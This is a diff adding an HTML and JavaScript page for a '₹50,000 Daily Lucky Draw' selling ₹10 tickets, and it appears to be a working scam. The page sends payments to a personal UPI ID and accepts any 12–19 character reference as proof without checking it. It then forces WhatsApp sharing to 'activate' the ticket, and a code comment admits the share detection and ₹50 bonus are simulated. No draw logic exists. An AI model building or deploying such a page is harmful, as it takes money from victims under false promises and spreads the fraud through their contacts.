@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>₹10 Lucky Draw</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&display=swap');
+        
+        :root {
+            --gold: #FFD700;
+            --black: #111;
+        }
+        
+        body {
+            background: var(--black);
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: var(--gold);
+            margin-bottom: 10px;
+        }
+        
+        .ticket-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .ticket {
+            background: #222;
+            border: 2px solid var(--gold);
+            border-radius: 8px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .ticket.selected {
+            background: var(--gold);
+            color: black;
+        }
+        
+        button {
+            background: var(--gold);
+            color: black;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+            width: 100%;
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: #222;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 100%;
+            border: 2px solid var(--gold);
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            background: #333;
+            color: white;
+        }
+        
+        .whatsapp-btn {
+            background: #25D366;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .ticket-confirmed {
+            font-size: 48px;
+            color: var(--gold);
+            margin: 20px 0;
+            animation: pulse 1s infinite alternate;
+        }
+        
+        @keyframes pulse {
+            to { transform: scale(1.05); }
+        }
+        
+        .fade-out {
+            animation: fadeOut 2s forwards;
+        }
+        
+        @keyframes fadeOut {
+            to { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <h1>₹50,000 DAILY LUCKY DRAW</h1>
+    <p>Pick your lucky number (100-120)</p>
+    <p>Only ₹10 per ticket</p>
+    
+    <div class="ticket-grid" id="ticketGrid">
+        <!-- Numbers will be added by JavaScript -->
+    </div>
+    
+    <button id="confirmBtn" disabled>CONFIRM TICKET</button>
+    
+    <div id="paymentModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <h2>PAY ₹10</h2>
+            <p>Send payment to: keanjohn72@oksbi</p>
+            <p>Enter UPI Reference:</p>
+            <input type="text" id="upiRef" placeholder="12-19 digit number">
+            <button id="submitPaymentBtn">SUBMIT PAYMENT</button>
+        </div>
+    </div>
+    
+    <div id="shareModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <h2>SHARE TO ACTIVATE</h2>
+            <p>Share with 1 friend on WhatsApp</p>
+            <button class="whatsapp-btn" id="whatsappBtn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20">
+                SHARE ON WHATSAPP
+            </button>
+        </div>
+    </div>
+    
+    <div id="confirmationModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <h2>YOUR TICKET IS CONFIRMED!</h2>
+            <div class="ticket-confirmed" id="confirmedTicket"></div>
+            <p>Come back tomorrow at 8PM for results</p>
+        </div>
+    </div>
+    
+    <div id="bonusModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <h2>GET ₹50 BONUS!</h2>
+            <p>Share with 3 friends to get ₹50 extra if you win</p>
+            <button class="whatsapp-btn" id="bonusWhatsappBtn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="20">
+                SHARE WITH FRIENDS
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Generate tickets 100-120
+        const ticketGrid = document.getElementById('ticketGrid');
+        for (let i = 100; i <= 120; i++) {
+            const ticket = document.createElement('div');
+            ticket.className = 'ticket';
+            ticket.textContent = i;
+            ticket.addEventListener('click', function() {
+                document.querySelectorAll('.ticket').forEach(t => t.classList.remove('selected'));
+                this.classList.add('selected');
+                document.getElementById('confirmBtn').disabled = false;
+            });
+            ticketGrid.appendChild(ticket);
+        }
+        
+        // Flow control
+        let selectedTicket = null;
+        
+        document.getElementById('confirmBtn').addEventListener('click', function() {
+            selectedTicket = document.querySelector('.ticket.selected').textContent;
+            document.getElementById('paymentModal').style.display = 'flex';
+        });
+        
+        document.getElementById('submitPaymentBtn').addEventListener('click', function() {
+            const upiRef = document.getElementById('upiRef').value;
+            if (upiRef.length >= 12 && upiRef.length <= 19) {
+                document.getElementById('paymentModal').style.display = 'none';
+                document.getElementById('shareModal').style.display = 'flex';
+            } else {
+                alert('Please enter valid UPI reference (12-19 digits)');
+            }
+        });
+        
+        document.getElementById('whatsappBtn').addEventListener('click', function() {
+            const message = `I just got ticket #${selectedTicket} for the ₹50,000 Daily Lucky Draw! Only ₹10 to enter - results at 8PM. Try your luck now!`;
+            window.open(`https://wa.me/?text=${encodeURIComponent(message)}`, '_blank');
+            
+            document.getElementById('shareModal').style.display = 'none';
+            document.getElementById('confirmedTicket').textContent = `#${selectedTicket}`;
+            document.getElementById('confirmationModal').style.display = 'flex';
+            
+            setTimeout(() => {
+                document.getElementById('confirmationModal').classList.add('fade-out');
+                setTimeout(() => {
+                    document.getElementById('confirmationModal').style.display = 'none';
+                    document.getElementById('confirmationModal').classList.remove('fade-out');
+                    document.getElementById('bonusModal').style.display = 'flex';
+                }, 2000);
+            }, 3000);
+        });
+        
+        document.getElementById('bonusWhatsappBtn').addEventListener('click', function() {
+            const message = `I just got ticket #${selectedTicket} for the ₹50,000 Daily Lucky Draw! Only ₹10 to enter - results at 8PM. Try your luck now!`;
+            window.open(`https://wa.me/?text=${encodeURIComponent(message)}`, '_blank');
+            
+            // Auto-confirm after 1 second (simulating share detection)
+            setTimeout(() => {
+                document.getElementById('bonusModal').style.display = 'none';
+                alert('Bonus ₹50 activated! You will receive it if you win!');
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
